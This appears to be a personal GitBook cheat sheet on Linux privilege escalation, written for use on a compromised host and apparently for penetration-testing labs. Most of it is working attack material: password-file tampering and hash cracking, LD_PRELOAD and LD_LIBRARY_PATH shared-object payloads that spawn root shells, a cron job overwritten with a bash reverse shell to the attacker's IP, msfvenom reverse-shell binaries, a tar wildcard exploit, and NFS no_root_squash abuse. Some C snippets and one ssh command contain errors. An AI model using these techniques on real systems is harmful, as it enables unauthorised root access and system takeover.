---
description: Time to break some stuff...
---

# Escalation Techniques

{% embed url="https://medium.com/system-weakness/basic-linux-privilege-escalation-cheat-sheet-b43faee63467" %}

## Privilege Escalation Strategy

### Enumeration is key

1. Check your user

```
id
whoami
```

2\. Run Linux Smart Enumeration with increasing levels

```
# Initial run
./lse.sh

# Didn't find anything interesting?
./lse.sh -l1

# Still nothing? 
./lse.sh -l2
./lse.sh -l2 | less -r
```

3\. Run LinEnum, LinPEAS, and PSPY.

### Strategy

* Spend time and read over the results of your enumeration
* If LSE, LinPEAS, or any other script generates interesting results, be sure to take note of it
* Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work
* Have a quick look around for files in your user's home directory and other common locations such as /var/backup /var/logs
* Always read the history file, it may have important information like commands or passwords

#### Go for the low hanging fruit first

1. Try things that are easy at first

* Sudo
* Cron Jobs
* SUID files

2\. Have a look at root processes, enumerate the versions of those processes and search for exploits

3\. Check for internal ports that you might be able to forward to your attacking machine!

4\. If you still do not have root, re-read your full enumeration dumps and highlight anything that seems odd.

5\. Look for the unusual and if you still cannot find anything, look for Kernel Exploits.

## Recursive File Search for DB Creds

db

```
grep -Ri 'db' . --color=auto
```

sql

```
grep -Ri 'sql' . --color=auto
```

* Look for $username or $password
* In this example, the username for mysql is root and the password is null!

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Kernel Exploits

Finding and using kernel exploits:

1. Enumerate kernel version `uname -a`
2. Find matching exploits (Google, ExploitDB, and GitHub)
3. Compile and run

<mark style="color:red;">Note</mark>: Kernel exploits can cause system instability and it is very important that all information is verified prior to running an exploit.

### Checklist

1. Enumerate kernel version:

```
uname -a 
Linux debian 2.6.32
```

2\. Utilize Searchsploit to find an exploit:

```
searchsploit linux kernel 2.6.32 priv esc

searchsploit linux kernel debian 2.6.32 priv esc 
```

3\. Run Linux Exploit Suggester v.2:

```
./linux-exploit-suggester-2.pl -k 2.6.32
```

{% embed url="https://github.com/jondonas/linux-exploit-suggester-2" %}
GitHub Repository
{% endembed %}

## Service Exploits

Services are simply programs that run in the background, accepting input or performing regular tasks.

If vulnerable services are running as root, exploiting them can lead to command execution as root.

Service exploits can be found using SearchSploit, Google, and GitHub, just like when Kernel exploits.

### Services Running as Root

The following command will show all processes that are running as root:

```
ps aux | grep "^root"
```

With any results, try to identify the version number of the program being executed.

### Enumerating Program Versions

Running the program with the --version/-v command line option often shows the version number:

```
<program> --version
<program> -v
```

On Debian-like distributions, dpkg can show installed programs and their version:

```
dpkg -l | grep <program>
```

On systems that use rpm, the following achieves the same:

```
rpm -qa | grep <program>
```

### Port Forwarding

In some cases, a root process can be bound to an internal port, through which it communicates.

If for some reason the exploit cannot be locally ran on the target machine, the port can be forwarded using SSH to your local machine:

```
ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machine>
```

* Now, the exploit code can now be run on your local machine on a arbitrary port of your choosing

#### Use Case:

MySQL is running internally on the compromised host (127.0.0.1:3306)

* How did we figure this out?

```
netstat -nl
tcp    0    127.0.0.1:3306    0.0.0.0:*    LISTEN
```

Port Forward:

```
ssh -R 127.0.0.1:3306 root<kali-machine>
```

* This will keep the connection open but will not throw you directly into a session
* Switch over to your Kali box and access MySQL on 4444

Instruct MySQL to connect to port forward:

```
mysql -u root -h 127.0.0.1 -P 4444
```

## Weak File Permissions

Certain system files can be taken advantage of to perform priv esc if the permissions on them are too weak.

If a system has confidential information we can read, it may be used to gain access to the root account.

If a system file can be written to, we may be able to modify the way the OS works and gain root access that way.

### /etc/shadow

This file contains the user password hashes and is not readable by any user except for root by default.

If we are able to read /etc/shadow, we can possibly crack the root user's password hash.

If we are able to modify the file, we can replace the root user's password hash with one we know.

* Note: /etc/shadow will come up as a writeable/readable file in automated tools!
  * However, it is still important to know how to do this manually:

#### Readable /etc/shadow

Verify vulnerable permissions:

```
ls -l /etc/shadow
#Example of readable/writeable /etc/shadow file
-rw-r--rw- 1 root shadow
```

Extract hash:

```
head -n 1 /etc/shadow
```

Place the hash into a file called hash.txt:

```
nano hash.txt
```

Crack the password using john with the rockyou.txt wordlist:

```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

"su":

```
su
Password:
root@debian#
```

#### Writeable /etc/shadow

Verify vulnerable permissions:

```
ls -l /etc/shadow
-rw-r--rw 1 root shadow
```

Create backup of /etc/shadow:

```
cp /etc/shadow /home/user/
```

Generate new password utilizing SHA-512:

```
 mkpasswd -m sha-512 newpassword
```

Add hash to file:

```
nano /etc/shadow
```

Switch User:

```
su
Password:
id
uid=0(root)
root@debian:/home/user#
```

### /etc/passwd

The /etc/passwd historically contained user password hashes.

If we can write to /etc/passwd, we can easily enter a known password hash for the root user, and then use the su command to switch to the root user.

Verify vulnerable permissions of /etc/passwd:

```
ls -l /etc/passwd
-rw-r--rw 1 root root /etc/passwd
```

Generate a new hash for a known password on your local machine:

```
openssl passwd "password"
dRCtCEMsFRnA2
```

Once the hash is obtained, navigate back to the compromised host and modify the /etc/passwd file:

Note: Enter the hash in the second field of the root user's row (should be an x).

```
nano /etc/passwd
root:dRCtCEMsFRnA2:0:0:root:/root:/bin/bash
```

Su into the new user with the newly set password:

```
su
Password:
root@debian# id
uid=0(root)
```

### Backups

Even if a machine has correct permissions on important or sensitive files, a user may have created insecure backups of these files.

It is always worth exploring the file system looking for readable backup files.

Some common places include user home directories, the <mark style="color:yellow;">/ (root) directory</mark>, <mark style="color:yellow;">/tmp</mark>, and <mark style="color:yellow;">/var/backups</mark>.

## Sudo

Sudo is a program which lets users run other programs with security privileges of other users.

By default, that user will be root.

A user generally needs to enter their password to use sudo, and they must be permitted access via rule(s) in the /etc/sudoers file.

Rules can be used to limit users to certain programs, and forgo the password entry requirement.

#### Useful Commands

Run a program using sudo:

```
sudo <program>
```

Run a program as a specific user:

```
sudo -u <username> <program>
```

List programs a user is allowed (and disallowed) to run:

```
sudo -l
```

### Known Password

Attempt sudo as it was intended:

```
sudo su
```

* Attempt password reuse (if you know the password)
* Attempt weak credentials

### Other Methods

If for some reason the su program is not allowed, there are other ways to escalate privileges:

```
sudo -s
sudo -i
sudo /bin/bash
sudo passwd

```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption><p>Very cool priv esc vector via apache2</p></figcaption></figure>

### Shell Escape Sequences

Even if we are restricted to running certain programs via sudo, it is sometimes possible to "escape" the program and spawn a shell.

Since the initial program runs with root privileges, so does the spawned shell.

A list of programs with theit shell escape sequences can be found on GTFOBins:

{% embed url="https://gtfobins.github.io/" %}

### Environment Variables

Programs run through sudo can inherit the environment variables from the user's environment.

In the /etc/sudoers config file, if the env\_reset option is set, sudo will run programs in a new, minimal environment.

The env\_keep option can be used to keep certain environment variables from the user's environment.

The configured options are displayed when running sudo -l

### LD\_PRELOAD

This is an environment variable which can be set to the path of a shared object (.so) file.

When set, the shared object will be loaded before any others.

By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.

How to detect this:

```
sudo -l
env_keep+LD_PRELOAD
```

Create a file callled preload.c:

```
#include <stdio.h>
#include <sys/types.h>
#include <stlib.h>

void_init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

Gain root:

```
nano preload.c
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so find
root#
```

### LD\_LIBRARY\_PATH

The LD\_LIBRARY\_PATH environment variable contains a set of directories where shared libraries are searched for first.

How to detect this:

```
sudo -l
env_keep+=LD_LIBRARY_PATH
```

The ldd command can be used to print the shared libraries used by a program:

```
ldd /usr/sbin/apache2
```

By creating a shared library with the same name as one used by a program, and setting LD\_LIBRARY\_PATH to its parent directory, the program will load our shared library instead.

Create a file with the name library\_path.c:

```
#include <stdio.h>
#include <stdlib.h>

static void () __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

Select a binary that is detected with `sudo -l`

```
sudo -l

(sudo) NOPASSWD: /usr/sbin/apache2
```

Run the ldd command against the apache2 binary:

```
ldd /usr/sbin/apache2
libcrypt.so.1
```

Compile the shared object using the same name as another shared object found in ldd:

```
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```

Set the LD\_LIBRARY\_PATH variable to the current directory where we compiled the SO:

```
sudo LD_LIBRARY_PATH=. apache2
root#
```

## Cron Jobs

* Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.
* Cron jobs run with the security level of the user who owns them.
* By default, cron jobs are run using the /bin/sh shell, with limited environment variables.
* Cron table files (crontabs) store the configuration for cron jobs.
* User crontabs are usually located in /var/spool/cron/ or /var/spool/cron/crontabs/
* The system-wide crontab is located at /etc/crontab

### File Permissions

* Misconfigurations of file permissions associated with cron jobs can lead to easy privilege escalation
* If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code.

How can we detect this?

```
cat /etc/crontab
```

Replace a writeable binary/script with the contents of a reverse shell (maintain the original name of the file):&#x20;

```
#!/bin/bash

bash -i >& /dev/tcp/<kali-ip-tun0/53> 0>&1
```

Switch over to your local machine, set up a netcat listener, and wait for the cronjob:

```
nc -lnvp 53
root@debian:
```

### PATH Environment Variable

The crontab PATH environment variable is by default set to /usr/bin:/bin

The PATH variable can be overwritten in the crontab file.

If a cron job program/script does not use an absolute path, and one of the PATH directories is writeable by our user, we may be able to create a program/script with the same name as the cron job.

How can we detect this?

```
lse.sh 
Can we write to any paths present in cron jobs? yes!

/etc/crontab:/PATH=/home/user/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

View the content of /etc/crontab:

```
cat /etc/crontab
/etc/crontab:/PATH=/home/user/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

* We see that path variable: /home/user is searched before anywhere else.
* If we replace a new file in /home/user with the same name but put something malicious in it, we can achieve great things!

Create file found in /etc/crontab:

```
nano overwrite.sh
```

Contents of overwrite.sh:

```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

* This will create a SUID version of BASH for us in the /tmp directory

Make overwrite.sh executable:

```
chmod +x overwrite.sh
```

Wait for the cronjob to execute and apply our changes:

```
watch -n 1 ls -l /tmp
ls -l
/tmp/rootbash -p
rootbash# 
```

### Wildcards

* This one is a little weird and I personally have not seen it around, but GTFOBins has a section on it that goes into further detail.&#x20;

Use Case:

* A script that takes advantage of a binary that utilizes a wildcard.

Example:

```
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

So, how do you take advantage of this?

1. Create a reverse shell with msfvenom

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=53 -f elf -o shell.elf
```

2\. Transfer reverse shell binary to the compromised host

3\. Create an "action" at each checkpoint on the compromised host

```
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=shell.elf
```

4\. Begin a netcat listener on your Kali machine

```
nc -lnvp 53
```

5\. Wait for the crontab to run and you will get a root shell

## SUID/SGID Files

<mark style="color:yellow;">SUID</mark> files get executed with the privileges of the file owner.

<mark style="color:yellow;">SGID</mark> files get executed with the privileges of the file group.

NOTE: If the file is owned by root, it gets executed with root privileges and we will be able to use it to escalate privileges.&#x20;

### Finding SUID/SGID Files

We can use the following find command to locate files with the SUID or SGID bits set:

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

## Passwords & Keys

Although rare, weak password storage and password reuse can be an easy way to escalate privileges.

Be sure to always check config files for cleartext credentials.

If the root user reused their password for a service, that password may be found and used to switch to the root user.&#x20;

### History Files

History files record issued by users while they are using certain programs.

If a user types a password as part of a command, the password may get stored in a history file.

It is always a good idea to try switching to the root user with a discovered password.

Commands

```
cat .*history |  less
```

## NFS

Network File System (NFS) is a popular distributed file system.

NFS shares are configured in the /etc/exports file.

Remote users can mount shares, access, create, and modify files.

### Root Squashing

This is how NFS prevents privilege escalation.

If the remote user is root (uid=0), NFS will instead "squash" the user and treat them as if they are in the nobody group.

### no\_root\_squash

This is an NFS configuration that turns root squashing off.

When included in a writable share configuration, a remote user who identifies as root can create files on the NFS share as the local root user!

How to detect this?

```
cat /etc/exports

showmount -e <target-ip>
/tmp *
```

How to exploit this:

```
mkdir /tmp/nfs
mount -o rw,vers=2 <target-ip>:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
ls -l /tmp
```

Connecting to reverse shell:

```
/tmp/shell.elf
bash-4.1#
```



##
